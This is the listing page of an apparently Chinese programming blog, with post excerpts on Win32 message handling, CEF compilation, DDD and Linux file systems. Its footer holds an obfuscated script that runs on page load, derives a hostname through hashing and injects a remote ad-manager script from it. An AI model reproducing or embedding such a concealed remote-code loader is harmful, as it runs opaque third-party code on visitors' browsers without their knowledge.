windows消息分析器的实现很好理解,windows操作系统使用消息处理机制,那么,我们所设计的程序如何才能分辨和处理系统中的各种消息呢?这就是消息分析器的作用.
简单来说,消息分析器就是一段代码,在我的讲述中,将分7重来循序渐进的介绍它.从最初的第1重到最成熟的第7重,它的样子会有很大的变化.但,实现的功能都是一样的,所不同的,仅仅是变得更加简练罢了.
程序开始时候,是WinMain函数,然后会生成初始的窗口,同时会调用WndProc函数.这是一个自定义的函数,名字也会有变化,但其功能是一样的,就是运行消息分析器.WndProc函数如下:
LRESULT CALLBACK WndProc (HWND hwnd, UINT msg,WPARAM wParam, LPARAM lParam)
{
//......
return DefWindowProc(hwnd, msg, wParam, lParam);
}
这其中,hwnd是窗口的句柄,msg是系统发送来的消息的名字.wParam和lParam则是随消息一起发送来的消息参数.
WndProc函数使用了消息分析器，下面把消息分析器的内容解释一下：
第一重:当不同的消息出现时，在其中写入相应的程序语句即可。
LRESULT CALLBACK WndProc (HWND hwnd, UINT msg,WPARAM wParam, LPARAM lParam)
{
switch(msg)
{
case WM_CREATE:
// ...
return 0;
case WM_PAINT:
// ...
return 0;
case WM_DESTROY:
//...
return 0;
}
return DefWindowProc(hwnd, msg, wParam, lParam);
}
第二重:运用三个消息分析器进行处理。
LRESULT CALLBACK WndProc (HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cabea4c8f8dff708aba793df3acf1c5a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad9f3f6d41923a2fcdb8e629de7ce28e/" rel="bookmark">
			编译支持视频播放的cef控件版本109.0.5414.8(支持H264,mp3)源码已上传
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.创建目录结构
2. 同步代码
3. 同步完成后执行执行以下脚本生成工程
4. 开始编译
5. 打包sdk
6. 文件目录
7. 效果展示
8. sdk分享
9.完整源码分享
1.创建目录结构 D:/code/ automate/ automate-git.py chromium_git/ depot_tools/ automate-git.py从官网下载下来即可，depot_tools也直接从官网下载
2. 同步代码 chromium代码很大，同步出现网络状况需自行解决，本人把同步好的代码和编译好的sdk放在云盘上，大家可以到最后下载 cd D:\core\chromimum_git set DEPOT_TOOLS_UPDATE=0 set GN_DEFINES=is_component_build=true set GN_ARGUMENTS=--ide=vs2019 --sln=cef --filters=//cef/* @REM 环境目录有python可以，没有python需要执行 @REM set PATH=D:\code\depot_tools;%PATH% python ..\automate\automate-git.py --download-dir=D:\code\chromium_git --depot-tools-dir=D:\code\depot_tools --no-distrib --no-build --branch=5414 --force-clean --force-clean-deps --no-depot-tools-update 3. 同步完成后执行执行以下脚本生成工程 在D:\core\chromium_git\chromium\src\cef\
目录下创建create.bat文件内容如下：
@REM 修改成自己的vs目录和windowssdk目录 set DEPOT_TOOLS_UPDATE=0 set GYP_MSVS_OVERRIDE_PATH=D:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise set GYP_GENERATORS=msvs-ninja,ninja set WINDOWSSDKDIR=D:\Windows Kits\10 set DEPOT_TOOLS_WIN_TOOLCHAIN=0 @REM support mp4 and mp3 use_thin_lto不能少用来pack最后的sdk用 set GN_DEFINES=ffmpeg_branding=Chrome proprietary_codecs=true is_official_build=true is_component_build=false use_thin_lto=false set GYP_MSVS_VERSION=2019 set CEF_ARCHIVE_FORMAT=tar.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ad9f3f6d41923a2fcdb8e629de7ce28e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77972449cd6c95b497734aae37460f09/" rel="bookmark">
			DDD全网最通俗易懂讲解（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基础概念 领域 领域就是用来确定范围的，范围即边界，这也是DDD在设计中不断强调边界的原因。简言之，DDD的领域就是这个边界内要解决的业务问题域。领域可以进一步划分为子领域。一个领域相当于一个问题域，领域拆分为子域的过程就是大问拆分为小问题的过程。
其实好理解，领域会细分为不同的子域他们分别是：核心域，通用域和支撑域
决定产品和公司核心竞争力的子域就是核心域，他是业务成功的主要因素和公司的核心竞争力。没有太多个性化的述求，同时被多个子域使用的通用功能子域就是通用域。还有一种功能子域是必须的，但即不包含决定产品和公司核心竞争力的功能，也不包含通用功能的子域，就是支撑域
通用域例子：比如认证、权限，这些都很容易买到。而支撑域则具有企业特性，但不具有通用性，例如数据代码类的数据字典等
聚合根和领域服务负责封装实现业务逻辑。领域服务负责对聚合更进行调度和封装，同时可以对外提供各种类型的服务，对于不能直接通过聚合根的就需要通过领域服务。
聚合根其实就是本身无法完全处理这个逻辑，例如支付这个逻辑，订单聚合不可能支付，所以在订单聚合上架一层领域服务，在领域服务中实现支付逻辑，然后应用服务调用领域服务。
遵守以下规范：
1.同限界上下文内的聚合之间的领域服务可直接调用
2.两个限界上下文的交互必须通过应用服务层抽离接口-&gt;适配层适配
例子，用户升职，上机领导要变，上级领导的下属要变代码如下
限界上下文 限界就是领域的边界，而上下文则是语义环境，通过领域的限界上下文，我们可以在统一的领域边界内用统一的语言进行交流，简单来说限界上下文可以理解为语义环境。
综合一下，我认为限界上下文的定义就是：用来封装通用语言和领域对象，提供上下文环境，保证领域之内的一些术语，业务相关对象等有一个确定的含义，没有二义性。这个边界定义了模型的适用范围，使团队所有成员能够明确的知道什么应该在模型中实现，什么不应该在模型中实现。
如果没有具体的语义环境，还真不太好理解。但是，如果你已经知道了这句话的语义环境，比如是寒冬腊月或者是炎炎夏日，那理解这句话的涵义就会很容易了。
所以语言离不开它的语义环境。
而业务的通用语言就有它的业务边界，我们不大可能用一个简单的术语没有歧义地去描述一个复杂的业务领域。限界上下文就是用来细分领域，从而定义通用语言所在的边界。
正如电商领域的商品一样，商品在不同的阶段有不同的术语，在销售阶段是商品，而在运输阶段则变成了货物。同样的一个东西，由于业务领域的不同，赋予了这些术语不同的涵义和职责边界，这个边界就可能会成为未来微服务设计的边界。看到这，我想你应该非常清楚了，领域边界就是通过限界上下文来定义的。
理论上限界上下文就是微服务的边界。我们将限界上下文内的领域模型映射到微服务，就完成了从问题域到软件的解决方案。
可以说，限界上下文是微服务设计和拆分的主要依据。在领域模型中，如果不考虑技术异构、团队沟通等其它外部因素，一个限界上下文理论上就可以设计为一个微服务。
贫血模型和充血模型 贫血模型 贫血模型具有一堆属性和set get方法，存在的问题就是通过pojo这个对象上看不出业务有哪些逻辑，一个pojo可能被多个模块调用，只能去上层各种各样的service来调用，这样以后当梳理这个实体有什么业务，只能一层一层去搜service，也就是贫血失忆症，不够面向对象。
充血模型 比如如下user用户有改密码，改手机号，修改登录失败次数等操作，都内聚在这个user实体中，每个实体的业务都是清晰的，就是充血模型，充血模型的内存计算会多一些，内聚核心业务逻辑处理。
说白了就是，不只是有贫血模型中setter getter方法，还有其他的一些业务方法，这才是面向对象的本质，通过user实体就能看出有哪些业务存在。
@NoArgsConstructor @Getter public class User extends Aggregate&lt;Long, User&gt; { /** * 用户名 */ private String userName; /** * 姓名 */ private String realName; /** * 手机号 */ private String phone; /** * 密码 */ private String password; /** * 锁定结束时间 */ private Date lockEndTime; /** * 登录失败次数 */ private Integer failNumber; /** * 用户角色 */ private List&lt;Role&gt; roles; /** * 部门 */ private Department department; /** * 用户状态 */ private UserStatus userStatus; /** * 用户地址 */ private Address address; public User(String userName, String phone, String password) { saveUserName(userName); savePhone(phone); savePassword(password); } /** * 保存用户名 * @param userName */ private void saveUserName(String userName) { if (StringUtils.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/77972449cd6c95b497734aae37460f09/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7c151b711574f450846dd68fc3d7993/" rel="bookmark">
			深入解析Windows窗口创建和消息分发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Windows GUI采用基于事件驱动的编程模型，事实上几乎所有的界面库都是这样做的。在纯粹的Window32 SDK编程时代，人们还可以搞懂整个Windows窗体创建和消息的流通过程，但是在现在各种框架的包装下很多在Window32 SDK下很明显易懂的东西显得不是那么简单了。本文力图去繁求简，教你看懂所有框架的基本构造，而事实上对于了解这一切的人来说，这些界面框架的设计都是如出一辙的，希望看完本文，再去看常见的MFC/WTL等框架时，不会再觉得有任何的不适。
C程序的处理办法 1.基本原理 先说古老的Win32 SDK的做法，他们很明显，这里还是先贴上代码，为了缩减篇幅很多地方我就省略了
int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow) { static TCHAR szAppName[] = TEXT ("TestClass"); HWND hwnd; MSG msg; WNDCLASSEX wndclassex = {0}; //1.设计窗口类 wndclassex.cbSize = sizeof(WNDCLASSEX); wndclassex.style = CS_HREDRAW | CS_VREDRAW; wndclassex.lpfnWndProc = WndProc ... //2.注册窗口类 if (!RegisterClassEx (&amp;wndclassex)) { MessageBox (NULL, TEXT ("RegisterClassEx failed!"), szAppName, MB_ICONERROR); return 0; } //3.创建窗口 hwnd = CreateWindowEx (WS_EX_OVERLAPPEDWINDOW, szAppName, ... //4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d7c151b711574f450846dd68fc3d7993/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fdfeed04a100432906e0eca9548924b/" rel="bookmark">
			论Linux文件系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文旨在高屋建瓴地来讨论 Linux 文件系统概念，而不是对某种特定的文件系统，比如 EXT4 是如何工作的进行具体的描述。另外，本文也不是一个文件系统命令的教程。 每台通用计算机都需要将各种数据存储在硬盘驱动器（HDD）或其他类似设备上，比如 USB 存储器。这样做有两个原因。首先，当计算机关闭以后，内存（RAM）会失去存于它里面的内容。尽管存在非易失类型的 RAM，在计算机断电以后还能把数据存储下来（比如采用 USB 闪存和固态硬盘的闪存），但是，闪存和标准的、易失性的 RAM，比如 DDR3 以及其他相似类型的 RAM 相比，要贵很多。
数据需要存储在硬盘驱动上的另一个原因是，即使是标准的 RAM 也要比普通硬盘贵得多。尽管 RAM 和硬盘的价格都在迅速下降，但是 RAM 的价格依旧在以字节为单位来计算。让我们进行一个以字节为单位的快速计算：基于 16 GB 大的 RAM 的价格和 2 TB 大的硬盘驱动的价格。计算显示 RAM 的价格大约比硬盘驱动贵 71 倍。今天，一个典型的 RAM 的价格大约是 0.000000004373750 美元/每字节。
直观的展示一下在很久以前 RAM 的价格，在计算机发展的非常早的时期，其中一种类型的 RAM 是基于在 CRT 屏幕上的点。这种 RAM 非常昂贵，大约 1 美元/每字节。
定义
你可能听过其他人以各种不同和令人迷惑的方式谈论过文件系统。文件系统这个单词本身有多重含义，你需要从一个讨论或文件的上下文中理解它的正确含义。
我将根据我所观察到的在不同情况下使用“文件系统”这个词来定义它的不同含义。注意，尽管我试图遵循标准的“官方”含义，但是我打算基于它的不同用法来定义这个术语（如下）。这就是说我将在本文的后续章节中进行更详细的探讨。
始于顶层 root（/）目录的整个 Linux 目录结构。
特定类型的数据存储格式，比如 EXT3、EXT4、BTRFS 以及 XFS 等等。Linux 支持近百种类型的文件系统，包括一些非常老的以及一些最新的。每一种文件系统类型都使用它自己独特的元数据结构来定义数据是如何存储和访问的。
用特定类型的文件系统格式化后的分区或逻辑卷，可以挂载到 Linux 文件系统的指定挂载点上。
文件系统的基本功能
磁盘存储是文件系统必须的功能，它与之伴生的有一些有趣而且不可或缺的细节。很明显，文件系统是用来为非易失数据的存储提供空间，这是它的基本功能。然而，它还有许多从需求出发的重要功能。
所有文件系统都需要提供一个名字空间，这是一种命名和组织方法。它定义了文件应该如何命名、文件名的最大长度，以及所有可用字符集中可用于文件名中字符集子集。它也定义了一个磁盘上数据的逻辑结构，比如使用目录来组织文件而不是把所有文件聚集成一个单一的、巨大的文件混合体。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fdfeed04a100432906e0eca9548924b/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/52/">«</a>
	<span class="pagination__item pagination__item--current">53/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/54/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>